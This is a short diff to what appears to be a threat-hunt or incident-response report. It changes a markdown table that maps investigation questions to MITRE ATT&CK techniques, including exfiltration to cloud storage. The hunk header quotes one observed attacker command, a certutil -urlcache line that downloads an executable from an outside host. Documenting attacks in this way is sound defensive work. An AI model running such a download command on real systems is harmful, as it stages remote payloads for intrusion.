@@ -417,9 +417,9 @@ certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Pu
 
 # MITRE ATT&CK Techniques Observed
 
-```md id="lfcyi9"
-| Question | MITRE ATT&CK Technique | ID |
-|---|---|---|
+```md id="ozud3d"
+| Question | Technique | ID |
+| --- | --- | --- |
 | 1. Stolen Data Source Directory | Data from Local System | T1005 |
 | 2. Exfiltration Destination | Exfiltration to Cloud Storage | T1567.002 |
 | 3. Attacker Email Attribution | Unsecured Credentials | T1552 |
